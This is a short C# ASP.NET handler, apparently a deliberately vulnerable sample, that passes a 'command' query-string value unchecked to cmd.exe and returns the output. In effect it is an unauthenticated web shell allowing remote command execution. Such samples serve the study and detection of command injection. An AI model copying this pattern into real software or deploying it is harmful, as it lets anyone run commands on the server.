using System;
using System.Diagnostics;
using System.Web;

public class VulnerableClass : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
        string command = context.Request.QueryString["command"];
        if (!string.IsNullOrEmpty(command))
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/C " + command;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            context.Response.Write(output);
        }
    }

    public bool IsReusable
    {
        get { return false; }
    }
}